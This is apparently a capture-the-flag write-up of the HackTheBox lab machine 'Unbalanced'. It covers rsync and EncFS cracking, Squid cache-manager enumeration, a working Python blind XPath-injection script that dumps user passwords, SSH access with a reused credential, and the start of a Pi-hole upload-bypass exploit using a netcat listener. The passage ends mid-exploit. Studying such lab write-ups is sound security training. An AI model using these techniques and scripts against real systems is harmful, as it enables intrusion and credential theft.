---
title: HTB: Unbalanced
url: https://0xdf.gitlab.io/2020/12/05/htb-unbalanced.html
date: 2020-12-05T14:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: htb-unbalanced, hackthebox, ctf, nmap, squid, http-proxy, foxyproxy, rsync, encfs, john, gobuster, squidclient, xpath-injection, python, pihole, webshell, upload, credentials, password-reuse, htb-joker, htb-zetta
---

![Unbalanced](https://0xdfimages.gitlab.io/img/unbalanced-cover.png)

Unbalanced starts with a Squid proxy and RSync. I’ll use RSync to pull back the files that underpin an Encrypted Filesystem (EncFS) instance, and crack the password to gain access to the backup config files. In those files I’ll find the Squid config, which includes the internal site names, as well as the creds to manage the Squid. Looking at the proxy stats, I can find two internal IPs, and guess the existence of a third, which is currently out of order for security fixes. In the site on the third IP, I’ll find XPath injection allowing me to leak a bunch of usernames and passwords, one of which provides SSH access to the host. I’ll exploit into a Pi-Hole container using an exploit to upload a webshell, and find a script which contains the root creds for the host. In Beyond Root, I’ll look at why the searchsploit version of the PiHole exploit didn’t work.

## Box Info

| Name | [Unbalanced](https://hackthebox.com/machines/unbalanced)  [Unbalanced](https://hackthebox.com/machines/unbalanced) [Play on HackTheBox](https://hackthebox.com/machines/unbalanced) |
| --- | --- |
| Release Date | [01 Aug 2020](https://twitter.com/hackthebox_eu/status/1288866072943308800) |
| Retire Date | 05 Dec 2020 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Unbalanced |
| Radar Graph | Radar chart for Unbalanced |
| First Blood User | 01:49:26[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| First Blood Root | 02:09:09[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| Creators | [polarbearer polarbearer](https://app.hackthebox.com/users/159204)  [GibParadox GibParadox](https://app.hackthebox.com/users/125033) |

## Recon

### nmap

`nmap` found three open TCP ports, SSH (22), rsync (873), and Squid Proxy (3128):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.200
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-10 20:50 EDT
Nmap scan report for 10.10.10.200
Host is up (0.016s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
873/tcp  open  rsync
3128/tcp open  squid-http

Nmap done: 1 IP address (1 host up) scanned in 8.12 seconds

root@kali# nmap -p 22,873,3128 -sC -sV -oA scans/tcpscripts 10.10.10.200
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-10 20:51 EDT
Nmap scan report for 10.10.10.200
Host is up (0.011s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)
|   256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)
|_  256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519)
873/tcp  open  rsync      (protocol version 31)
3128/tcp open  http-proxy Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.52 seconds

```

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) version, the host is likely running Debian 10 buster.

### Squid - TCP 3128

Having just solved [Joker](/2020/08/13/htb-joker.html#enumeration-through-proxy) (where I also needed to use a Squid Proxy), this was familiar. I added the Squid proxy as a FoxyProxy configuration:

![image-20200813214257180](https://0xdfimages.gitlab.io/img/image-20200813214257180.png)

With that proxy enabled, I tried to visit `http://127.0.0.1/`:

![image-20200813214327478](https://0xdfimages.gitlab.io/img/image-20200813214327478.png)

I either need creds to access this url, or it is blocked somehow. I’ll go look for creds and/or the config.

### RSync - TCP 873

I’ll use the `rsync` command to take a look at what modules are available on Unbalanced, just like I did in [Zetta](/2020/02/22/htb-zetta.html#rsync---tcp-8730):

```

root@kali# rsync --list-only -a rsync://10.10.10.200
conf_backups    EncFS-encrypted configuration backups

```

Only one module in this case, but “EncFS-encrypted configuration backups” sounds interesting. I can list the files using the `--list-only` in `rsync`:

```

root@kali# rsync --list-only -a rsync://10.10.10.200/conf_backups
drwxr-xr-x          4,096 2020/04/04 11:05:32 .
-rw-r--r--            288 2020/04/04 11:05:31 ,CBjPJW4EGlcqwZW4nmVqBA6
-rw-r--r--            135 2020/04/04 11:05:31 -FjZ6-6,Fa,tMvlDsuVAO7ek
-rw-r--r--          1,297 2020/04/02 09:06:19 .encfs6.xml
-rw-r--r--            154 2020/04/04 11:05:32 0K72OfkNRRx3-f0Y6eQKwnjn
-rw-r--r--             56 2020/04/04 11:05:32 27FonaNT2gnNc3voXuKWgEFP4sE9mxg0OZ96NB0x4OcLo-
-rw-r--r--            190 2020/04/04 11:05:32 2VyeljxHWrDX37La6FhUGIJS
-rw-r--r--            386 2020/04/04 11:05:31 3E2fC7coj5,XQ8LbNXVX9hNFhsqCjD-g3b-7Pb5VJHx3C1
-rw-r--r--            537 2020/04/04 11:05:31 3cdBkrRF7R5bYe1ZJ0KYy786
-rw-r--r--            560 2020/04/04 11:05:31 3xB4vSQH-HKVcOMQIs02Qb9,
-rw-r--r--            275 2020/04/04 11:05:32 4J8k09nLNFsb7S-JXkxQffpbCKeKFNJLk6NRQmI11FazC1
-rw-r--r--            463 2020/04/04 11:05:32 5-6yZKVDjG4n-AMPD65LOpz6-kz,ae0p2VOWzCokOwxbt,
-rw-r--r--          2,169 2020/04/04 11:05:31 5FTRnQDoLdRfOEPkrhM2L29P
-rw-r--r--            238 2020/04/04 11:05:31 5IUA28wOw0wwBs8rP5xjkFSs
-rw-r--r--          1,277 2020/04/04 11:05:31 6R1rXixtFRQ5c9ScY8MBQ1Rg
-rw-r--r--            108 2020/04/04 11:05:31 7-dPsi7efZRoXkZ5oz1AxVd-Q,L05rofx0Mx8N2dQyUNA,
-rw-r--r--          1,339 2020/04/04 11:05:32 7zivDbWdbySIQARaHlm3NbC-7dUYF-rpYHSQqLNuHTVVN1
-rw-r--r--          1,050 2020/04/04 11:05:31 8CBL-MBKTDMgB6AT2nfWfq-e
-rw-r--r--            152 2020/04/04 11:05:31 8XDA,IOhFFlhh120yl54Q0da
-rw-r--r--             29 2020/04/04 11:05:31 8e6TAzw0xs2LVxgohuXHhWjM
-rw-r--r--          5,721 2020/04/04 11:05:31 9F9Y,UITgMo5zsWaP1TwmOm8EvDCWwUZurrL0TwjR,Gxl0
-rw-r--r--          2,980 2020/04/04 11:05:31 A4qOD1nvqe9JgKnslwk1sUzO
-rw-r--r--            443 2020/04/04 11:05:31 Acv0PEQX8vs-KdK307QNHaiF
-rw-r--r--            935 2020/04/04 11:05:31 B6J5M3OP0X7W25ITnaZX753T
-rw-r--r--          1,521 2020/04/04 11:05:32 Chlsy5ahvpl5Q0o3hMyUIlNwJbiNG99DxXJeR5vXXFgHC1
-rw-r--r--          2,359 2020/04/04 11:05:31 ECXONXBBRwhb5tYOIcjjFZzh
-rw-r--r--          1,464 2020/04/04 11:05:32 F4F9opY2nhVVnRgiQ,OUs-Y0
...[snip]...

```

I’ll grab all the files by running `rsync -a rsync://10.10.10.200/conf_backups/* rsync/`. I’ll also need to grab `.encfs6.xml` specifically (`rsync` won’t include it in the `*` because it starts with a `.`) by running `rsync -a rsync://10.10.10.200/conf_backups/.encfs6.xml rsync/`.

### EncFS

#### Background

The note from RSync said this folder was encrypted with [EncFS](https://en.wikipedia.org/wiki/EncFS). EncFS is a file system that transparently encrypts file using an arbitrary directory as storage for the encrypted files. There are two directories, the source directory and the mountpoint. What I have above is the source directory. I will want to use EncFS to mount that into a mount point where I’ll gain access to the decrypted files.

#### Crack Password

[This post](https://security.stackexchange.com/questions/98205/breaking-encfs-given-encfs6-xml) shows how to simply use [JohnTheRipper](https://github.com/openwall/john) to crack the password for EncFS. I’ll create a hash file by passing the entire directory to `encfs2john`:

```

root@kali# /usr/share/john/encfs2john.py rsync/ > encfs.john

```

And then start `john`:

```

root@kali# john --wordlist=/usr/share/wordlists/rockyou.txt encfs.john 
Using default input encoding: UTF-8
Loaded 1 password hash (EncFS [PBKDF2-SHA1 256/256 AVX2 8x AES])
Cost 1 (iteration count) is 580280 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bubblegum        (rsync/)
1g 0:00:00:15 DONE (2020-08-13 22:57) 0.06613g/s 47.61p/s 47.61c/s 47.61C/s nenita..bubblegum
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

It finds the password “bubblegum” pretty quickly.

#### Mount Folder

I’ll install EncFS with `apt install encfs`, and then mount the encrypted folder:

```

root@kali# encfs ~/hackthebox/unbalanced-10.10.10.200/rsync/ /mnt/
EncFS Password: 
root@kali# ls /mnt/
50-localauthority.conf              deluser.conf                    host.conf         main.conf                        reportbug.conf  ucf.conf
50-nullbackend.conf                 dhclient.conf                   initramfs.conf    mke2fs.conf                      resolv.conf     udev.conf
51-debian-sudo.conf                 discover-modprobe.conf          input.conf        modules.conf                     resolved.conf   update-initramfs.conf
70debconf                           dkms.conf                       journald.conf     namespace.conf                   rsyncd.conf     user.conf
99-sysctl.conf                      dns.conf                        kernel-img.conf   network.conf                     rsyslog.conf    user-dirs.conf
access.conf                         dnsmasq.conf                    ldap.conf         networkd.conf                    semanage.conf   Vendor.conf
adduser.conf                        docker.conf                     ld.so.conf        nsswitch.conf                    sepermit.conf   wpa_supplicant.conf
bluetooth.conf                      fakeroot-x86_64-linux-gnu.conf  libaudit.conf     org.freedesktop.PackageKit.conf  sleep.conf      x86_64-linux-gnu.conf
ca-certificates.conf                framework.conf                  libc.conf         PackageKit.conf                  squid.conf      xattr.conf
com.ubuntu.SoftwareProperties.conf  fuse.conf                       limits.conf       pam.conf                         sysctl.conf
dconf                               gai.conf                        listchanges.conf  pam_env.conf                     system.conf
debconf.conf                        group.conf                      logind.conf       parser.conf                      time.conf
debian.conf                         hdparm.conf                     logrotate.conf    protect-links.conf               timesyncd.conf

```

This appears to be the contents of `/etc`, or at least a selection of files from there.

#### Interesting Confs

The first thing I wanted to check out was the `squid.conf` (I’ll use `grep` to get only the uncommented lines):

```

root@kali# cat squid.conf | grep -vP "^#" | grep . 
acl localnet src 0.0.0.1-0.255.255.255  # RFC 1122 "this" network (LAN)
acl localnet src 10.0.0.0/8             # RFC 1918 local private network (LAN)
acl localnet src 100.64.0.0/10          # RFC 6598 shared address space (CGN)
acl localnet src 169.254.0.0/16         # RFC 3927 link-local (directly plugged) machines
acl localnet src 172.16.0.0/12          # RFC 1918 local private network (LAN)
acl localnet src 192.168.0.0/16         # RFC 1918 local private network (LAN)
acl localnet src fc00::/7               # RFC 4193 local private network range
acl localnet src fe80::/10              # RFC 4291 link-local (directly plugged) machines
acl SSL_ports port 443
acl Safe_ports port 80          # http
acl Safe_ports port 21          # ftp
acl Safe_ports port 443         # https
acl Safe_ports port 70          # gopher
acl Safe_ports port 210         # wais
acl Safe_ports port 1025-65535  # unregistered ports
acl Safe_ports port 280         # http-mgmt
acl Safe_ports port 488         # gss-http
acl Safe_ports port 591         # filemaker
acl Safe_ports port 777         # multiling http
acl CONNECT method CONNECT
http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports
http_access allow manager
include /etc/squid/conf.d/*
http_access allow localhost
acl intranet dstdomain -n intranet.unbalanced.htb
acl intranet_net dst -n 172.16.0.0/12
http_access allow intranet
http_access allow intranet_net
http_access deny all
http_port 3128
coredump_dir /var/spool/squid
refresh_pattern ^ftp:           1440    20%     10080
refresh_pattern ^gopher:        1440    0%      1440
refresh_pattern -i (/cgi-bin/|\?) 0     0%      0
refresh_pattern .               0       20%     4320
cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
cachemgr_passwd disable all
cache disable

```

I remember from [Joker](/2020/08/13/htb-joker.html#tftp---udp-69) getting creds out of this file, but I don’t see any here. I do see how it is configured to allow connections through to an internal network of 172.16.0.0/12 (that’s a big IP space), but also there’s a host name, intranet.unbalanced.htb.

There’s another line that I skipped over at first about the Cache Manager. This protocol defines how I can interact with the cache to get reports on what is cached, etc. I’ll come back to this later.

### Website - intranet.unbalanced.htb

Using the squid proxy and the domain name, I’m able to get to a site. I didn’t have to add this to my `/etc/hosts` file, as it’s proxying through the Squid.

The site is the internal site for employees:

[![image-20200816204407425](https://0xdfimages.gitlab.io/img/image-20200816204407425.png)](https://0xdfimages.gitlab.io/img/image-20200816204407425.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200816204407425.png)

All of the links and nav are dead, except for the login. I tried some basic creds (like admin/admin), and some basic SQL injection tricks, but didn’t find anything interesting.

I’ll run `gobuster` with including `.php` files, but didn’t find anything useful.

### Squid Cache Enumeration

The Squid proxy can perform a couple of different services. It can use authentication to ensure that only certain people can access the content behind it. It can also cache static content to speed up response times and reduce traffic to servers. As there’s no authentication to proxy through this Squid, I decided to look at the caching. I’ll need this line from the config:

```

cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events

```

The `cachemgr_password` [configuration directive](http://www.squid-cache.org/Doc/config/cachemgr_passwd/) sets a password, and then says which actions can be taken with that password.

`squidclient` will help with this (install with `apt install squidclient`). To run the `menu` command, I’ll run:

```

root@kali# squidclient -h 10.10.10.200 -w 'Thah$Sh1' mgr:menu
HTTP/1.1 200 OK                                                                   
Server: squid/4.6                                                                 
Mime-Version: 1.0                                                                 
Date: Sun, 16 Aug 2020 18:28:17 GMT                                               
Content-Type: text/plain;charset=utf-8                                            
Expires: Sun, 16 Aug 2020 18:28:17 GMT                                            
Last-Modified: Sun, 16 Aug 2020 18:28:17 GMT                            
X-Cache: MISS from unbalanced                                                     
X-Cache-Lookup: MISS from unbalanced:3128                                
Via: 1.1 unbalanced (squid/4.6)                                                   
Connection: close                                                                 

 index                  Cache Manager Interface                 disabled
 menu                   Cache Manager Menu                      protected
 offline_toggle         Toggle offline_mode setting             disabled
 shutdown               Shut Down the Squid Process             disabled
 reconfigure            Reconfigure Squid                       disabled
 rotate                 Rotate Squid Logs                       disabled
 pconn                  Persistent Connection Utilization Histograms    protected
 mem                    Memory Utilization                      protected
 ...[snip]...

```

If I just look at the options that are `protected`, I can see it matches with the actions identified in the config:

```

root@kali# squidclient -h 10.10.10.200 -w 'Thah$Sh1' mgr:menu | grep protected
 menu                   Cache Manager Menu                      protected
 pconn                  Persistent Connection Utilization Histograms    protected
 mem                    Memory Utilization                      protected
 diskd                  DISKD Stats                             protected
 fqdncache              FQDN Cache Stats and Contents           protected
 filedescriptors        Process Filedescriptor Allocation       protected
 objects                All Cache Objects                       protected
 vm_objects             In-Memory and In-Transit Objects        protected
 counters               Traffic and Resource Counters           protected
 5min                   5 Minute Average of Counters            protected
 60min                  60 Minute Average of Counters           protected
 histograms             Full Histogram Counts                   protected
 cbdata                 Callback Data Registry Contents         protected
 sbuf                   String-Buffer statistics                protected
 events                 Event Queue                             protected

```

I walked through the various menu options. The one that provided me interesting data was `fqdncache`:

```

root@kali# squidclient -h 10.10.10.200 -w 'Thah$Sh1' mgr:fqdncache
HTTP/1.1 200 OK
Server: squid/4.6
Mime-Version: 1.0
Date: Mon, 17 Aug 2020 00:59:26 GMT
Content-Type: text/plain;charset=utf-8
Expires: Mon, 17 Aug 2020 00:59:26 GMT
Last-Modified: Mon, 17 Aug 2020 00:59:26 GMT
X-Cache: MISS from unbalanced
X-Cache-Lookup: MISS from unbalanced:3128
Via: 1.1 unbalanced (squid/4.6)
Connection: close

FQDN Cache Statistics:
FQDNcache Entries In Use: 9
FQDNcache Entries Cached: 8
FQDNcache Requests: 275
FQDNcache Hits: 0
FQDNcache Negative Hits: 41
FQDNcache Misses: 234
FQDN Cache Contents:

Address                                       Flg TTL Cnt Hostnames
127.0.1.1                                       H -001   2 unbalanced.htb unbalanced
::1                                             H -001   3 localhost ip6-localhost ip6-loopback
172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb
172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb
127.0.0.1                                       H -001   1 localhost
172.17.0.1                                      H -001   1 intranet.unbalanced.htb
ff02::1                                         H -001   1 ip6-allnodes
ff02::2                                         H -001   1 ip6-allrouters

```

I now have the IP address of `intranet.unbalanced.htb` (172.17.0.1), but also two more hosts in a different subnet, `intranet-host2.unbalanced.htb` (172.31.179.2) and `intranet-host3.unbalanced.htb` (172.31.179.3).

### 172.31.179.2/3 - TCP 80

Visiting either of these new hostnames fails at the Squid (because the config doesn’t allow for those hostnames to be proxied), but both of the IP addresses return a page that looks the same at the `intranet.unbalanced.htb` host. I wanted to try to look for differences between them, so I hashed each page, and they are the same:

```

root@kali# curl -s http://intranet.unbalanced.htb/intranet.php -x http://10.10.10.200:3128 | md5sum
61e5d1d1e82083b8f64df61ed9f91320  -
root@kali# curl -s http://172.17.0.1/intranet.php -x http://10.10.10.200:3128 | md5sum
61e5d1d1e82083b8f64df61ed9f91320  -
root@kali# curl -s http://172.31.179.2/intranet.php -x http://10.10.10.200:3128 | md5sum
61e5d1d1e82083b8f64df61ed9f91320  -
root@kali# curl -s http://172.31.179.3/intranet.php -x http://10.10.10.200:3128 | md5sum
61e5d1d1e82083b8f64df61ed9f91320  -

```

I can try POSTs to the login form, but for each of the hosts, the same page comes back:

```

root@kali# curl -s http://172.31.179.3/intranet.php -x http://10.10.10.200:3128 -d 'username=sadfasfd&password=sadfasfds' | md5sum
61e5d1d1e82083b8f64df61ed9f91320  -
root@kali# curl -s http://172.31.179.2/intranet.php -x http://10.10.10.200:3128 -d 'username=sadfasfd&password=sadfasfds' | md5sum
61e5d1d1e82083b8f64df61ed9f91320  -

```

### 172.31.179.1 - TCP 80

If the .2 and .3 are host2 and host3 respectively, I can guess that .1 might be host1. I check, and it is:

[![image-20200817143548685](https://0xdfimages.gitlab.io/img/image-20200817143548685.png)](https://0xdfimages.gitlab.io/img/image-20200817143548685.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200817143548685.png)

It looks the same as the others. But the resulting hash is different:

```

root@kali# curl -s http://172.31.179.1/intranet.php -x http://10.10.10.200:3128 | md5sum
24d2bd49cd85dab4ee278f46ad284672  -
root@kali# curl -s http://172.31.179.2/intranet.php -x http://10.10.10.200:3128 | md5sum
61e5d1d1e82083b8f64df61ed9f91320  -

```

Interestingly, the only difference I can see in the pages is that the parameters for the POST request are capitalized:

```

root@kali# diff <(curl -s http://172.31.179.2/intranet.php -x http://10.10.10.200:3128) <(curl -s http://172.31.179.1/intranet.php -x http://10.10.10.200:3128)
57c57
<         <input class="w3-input w3-border" type="text" name="username" required>
---
>         <input class="w3-input w3-border" type="text" name="Username" required>
61c61
<         <input class="w3-input w3-border" type="password" name="password" required>
---
>         <input class="w3-input w3-border" type="password" name="Password" required>

```

Still, there could be other differences on the server side.

If I just hit the `index.php`, it returns an interesting message:

```

root@kali# curl -s http://172.31.179.1 -x http://10.10.10.200:3128
Host temporarily taken out of load balancing for security maintenance.

```

This is why it wasn’t in the cache.

When I try to log in, instead of getting back and unchanged page, I get back a error message:

![image-20200817151540889](https://0xdfimages.gitlab.io/img/image-20200817151540889.png)

## Shell as bryan on Unbalanced

### Enumeration

Playing with the new form, I notice when I add a `'` to the username or password, the error message goes away. For a long time, I figured this was an SQL injection, and tried a lot of different things to get it to leak more information or bypass the authentication and let me in. I tried manually and with `sqlmap`, but never worked (because it’s not SQL).

I eventually stumbled into XPATH injection with the username `' or 1=1 or ''='` and an arbitrary password:

![image-20200817152157470](https://0xdfimages.gitlab.io/img/image-20200817152157470.png)

Strangely, it doesn’t log into the site, but rather dumps a list of users with their emails and roles onto the page.

### XPath Background

XPath, or [XML Path Language](https://en.wikipedia.org/wiki/XPath), is a language for selecting nodes from an XML document. And like many query languages, it can be [injected into](https://owasp.org/www-community/attacks/XPATH_Injection). A typical query from the server side to check a login using XPath would look something like:

```

string(//user[name/text()='+VAR_USER+' and password/text()='+VAR_PASSWD+']/account/text())

```

That says to get the `user` node which has a child nodes `name` and `password`, and checks that the text values of those notes match the input username and input password. Then, it selects the `account` child node from that `user`, and returns the text as a string.

This basic XPATH injection works because of how XPATH handles grouping of multiple `or` and `and`. When I submitted the username of `' or 1=1 or ''='`, the above node selection becomes:

```

//user[name/text()='' or 1=1 or ''='' and password/text()='notthepassword']

```

XPath will group those booleans as:

```

//user[(name/text()='' or 1=1) or (''='' and password/text()='notthepassword')]

```

Which becomes:

```

//user[(false or true) or (true and false)]
//user[true or false]
//user[true]

```

and thus returns all users.

### XPath Brute Passwords

I also now have a way to test boolean statements. If I replace `1=1` with something I don’t know, if it returns the list of users, then it must have evaluated to true. If it doesn’t, then false. In fact, I can dump the entire XML document. Some manual checks showed that there’s only one node at the root. The script does the rest:

```

#!/usr/bin/env python3

import requests
import string
import sys

s = requests.session()
#s.proxies = {'http':'http://127.0.0.1:8080'}
s.proxies = {'http':'http://10.10.10.200:3128'}
keys = []

def xpath_req(test):
    resp = s.post('http://172.31.179.1/intranet.php', data={'Username':f"' or {test} or ''='", 'Password':'0xdf'})
    return 'Rita' in resp.text

def get_text(item, alpha=string.ascii_lowercase+string.ascii_uppercase):
    global keys
    for key in keys:
        if xpath_req(f"{item}='{key}'"):
            print(key, end='', flush=True)
            return key

    i = 1
    while True:
        if xpath_req(f'string-length({item})={i}'):
            break
        if i > 100:
            print("Error")
            sys.exit()
        i += 1

    text_len = i

    res = ''
    for i in range(1, text_len+1):
        for c in alpha:
            if xpath_req(f"substring({item}, 1, {i})='{res}{c}'"):
                res += c
                print(f'{c}', end='', flush=True)
                break
    keys += [res]
    return res

def get_node(node, depth=0):

    print(f'\n{" "*depth*2}<', end='', flush=True)
    node_name = get_text(f'name({node})')
    #print(node_name, end='', flush=True)
    print('>', end='', flush=True)

    # Count children
    i = 0
    while True:
        if xpath_req(f"count({node}/*)={i}"):
            #print(f'[+] {node} has {i} children')
            break
        i += 1
    num_children = i

    for i in range(1, num_children+1):
        get_node(f'{node}/*[position()={i}]', depth+1)

    if num_children == 0:
        #/Employees/Employee[position()=1]/Username='rita'
        #string-length(/Employees/*[position()=1]/Username)=3
        text = get_text(f'{node}', alpha=string.printable)
        #print(text, end='', flush=True)
    else:
        print(f'\n{" "*depth*2}', end='', flush=True)

    print(f'</{node_name}>', end='', flush=True)

get_node('/*[position()=1]')
print()

```

It takes a while to run, but dumps everything:

```

root@kali# time ./dump_xml.py 

<Employees>
  <Employee>
    <Username>rita</Username>
    <FirstName>Rita</FirstName>
    <LastName>Fubelli</LastName>
    <Email>rita@unbalanced.htb</Email>
    <Role>HR Manager</Role>
    <Password>password01!</Password>
  </Employee>
  <Employee>
    <Username>jim</Username>
    <FirstName>Jim</FirstName>
    <LastName>Mickelson</LastName>
    <Email>jim@unbalanced.htb</Email>
    <Role>Web Designer</Role>
    <Password>stairwaytoheaven</Password>
  </Employee>
  <Employee>
    <Username>bryan</Username>
    <FirstName>Bryan</FirstName>
    <LastName>Angstrom</LastName>
    <Email>bryan@unbalanced.htb</Email>
    <Role>System Administrator</Role>
    <Password>ireallyl0vebubblegum!!!</Password>
  </Employee>
  <Employee>
    <Username>sarah</Username>
    <FirstName>Sarah</FirstName>
    <LastName>Goodman</LastName>
    <Email>sarah@unbalanced.htb</Email>
    <Role>Team Leader</Role>
    <Password>sarah4evah</Password>
  </Employee>
</Employees>

real    29m33.703s
user    0m25.158s
sys     0m7.122s

```

### SSH

With a list of usernames and passwords, I tried each for SSH, and it worked for bryan:

```

root@kali# sshpass -p 'ireallyl0vebubblegum!!!' ssh bryan@10.10.10.200
Linux unbalanced 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Aug 19 14:03:47 2020 from 10.10.14.24
bryan@unbalanced:~$

```

I can grab `user.txt`:

```

bryan@unbalanced:~$ cat user.txt
6c9485a3************************

```

## Shell as www-data on Pi-hole

### Enumeration

#### General

There’s a note in bryan’s home directory, `TODO`:

```

bryan@unbalanced:~$ cat TODO 
############
# Intranet #
############
* Install new intranet-host3 docker [DONE]
* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]
* Test intranet-host3 [DONE]
* Add intranet-host3 to load balancer [DONE]
* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]
* Fix intranet-host2 [DONE]
* Re-add intranet-host2 to load balancer (set default weight) [DONE]
- Fix intranet-host1 [TODO]
- Re-add intranet-host1 to load balancer (set default weight) [TODO]

###########
# Pi-hole #
###########
* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]
* Set temporary admin password [DONE]
* Create Pi-hole configuration script [IN PROGRESS]
- Run Pi-hole configuration script [TODO]
- Expose Pi-hole ports to the network [TODO]

```

The Intranet section explains the vulnerabilities and configuration thus far. This Pi-hole section is new. Here’s my take-aways just from the note:
- There’s a [Pi-hole](https://pi-hole.net/) running in a docker container and listening on localhost.
- The admin password was changed from the default.
- There’s a configuration script somewhere that hasn’t yet been run.

#### Pi-Hole

I’ll look at the listening services and see there’s two TCP ports listening only on localhost, TCP 8080 and TCP 5553:

```

bryan@unbalanced:~$ ss -tnl
State     Recv-Q  Send-Q  Local Address:Port  Peer Address:Port                   
LISTEN    0       5             0.0.0.0:873        0.0.0.0:*                      
LISTEN    0       128         127.0.0.1:8080       0.0.0.0:*                      
LISTEN    0       128         127.0.0.1:5553       0.0.0.0:*                      
LISTEN    0       32            0.0.0.0:53         0.0.0.0:*                      
LISTEN    0       128           0.0.0.0:22         0.0.0.0:*                      
LISTEN    0       5                [::]:873           [::]:*                      
LISTEN    0       32               [::]:53            [::]:*                      
LISTEN    0       128              [::]:22            [::]:*                      
LISTEN    0       128                 *:3128             *:* 

```

My guess is that 8080 is the web component, and 5553 is the DNS component.

I’ll add a tunnel to SSH to point at 8080 using SSH control sequences (I could just start a new session as well). I’ll hit enter a couple times, then `~C` to drop to the `ssh>` prompt. There I can add a tunnel to the potential webserver:

```

ssh> -L 80:localhost:8080
Forwarding port.

bryan@unbalanced:/$

```

Now I can check `http://127.0.0.1` on my local Firefox (turning off the proxy through Squid):

![image-20200819153452638](https://0xdfimages.gitlab.io/img/image-20200819153452638.png)

The admin panel is located at `/admin` (which can be found from the link in the above image). It gives a dashboard:

![image-20200819153708739](https://0xdfimages.gitlab.io/img/image-20200819153708739.png)

There’s a link to Login, which leads to a form:

![image-20200819153742373](https://0xdfimages.gitlab.io/img/image-20200819153742373.png)

None of the passwords I’ve found this far work to get in, but just guessing “admin” works!

Once logged in, there’s a footer at the bottom of each page that gives the version:

![image-20200820160051438](https://0xdfimages.gitlab.io/img/image-20200820160051438.png)

#### Vulnerabilities

`searchsploit` shows there’s an authenticated remote code execution vulnerability in versions less than or equal to 4.4:

```

root@kali# searchsploit pi-hole
-------------------------------------------------------- ---------------------------------
 Exploit Title                                          |  Path
-------------------------------------------------------- ---------------------------------
Pi-Hole - heisenbergCompensator Blocklist OS Command Ex | php/remote/48491.rb
Pi-hole 4.4.0 - Remote Code Execution (Authenticated)   | linux/webapps/48519.py
Pi-hole < 4.4 - Authenticated Remote Code Execution     | linux/webapps/48442.py
Pi-hole < 4.4 - Authenticated Remote Code Execution / P | linux/webapps/48443.py
Pi-Hole Web Interface 2.8.1 - Persistent Cross-Site Scr | linux/webapps/40249.txt
-------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

The first four exploits are all the same bug.

### Webshell

I can try to run the scripts, but they don’t work in current form. [This blog post](https://frichetten.com/blog/cve-2020-11108-pihole-rce/) talks about how the bug was discovered, and gives a step by step for the manual process (and a lot of interesting technical detail). The bug isn’t technically RCE, but rather upload filter bypass that leads to RCE as it allows me to upload PHP into a directory that will run it.

Logged into the Pi-hole, I’ll pull up settings –> blocklists:

![image-20200820161648754](https://0xdfimages.gitlab.io/img/image-20200820161648754.png)

I’ll start Netcat with `nc -lnvp 80`, and then add the following new blocklist:

![image-20200820162029391](https://0xdfimages.gitlab.io/img/image-20200820162029391.png)

First I’ll hit Save, and it shows up in the list of blocklists:

[![image-20200820162352490](https://0xdfimages.gitlab.io/img/image-20200820162352490.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200820162352490.png)

Then I’ll hit Save and Update, and it redirects to a new page, which hangs waiting on a connection at my `nc`. I’ll return it a 200 OK, along with some arbitrary text, and then Ctrl-C to exit:

```

root@kali# nc -lnvp 80
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.200.
Ncat: Connection from 10.10.10.200:39718.
GET / HTTP/1.1
Host: 10.10.14.24
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
Accept: */*

HTTP/1.1 200 OK

0xdf was here!

^C

```

I’ll immediately restart the same `nc` listener.

Now the page loads, claiming to have updated the blocklists:

[![image-20200820162609611](https://0xdfimages.gitlab.io/img/image-20200820162609611.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200820162609611.png)

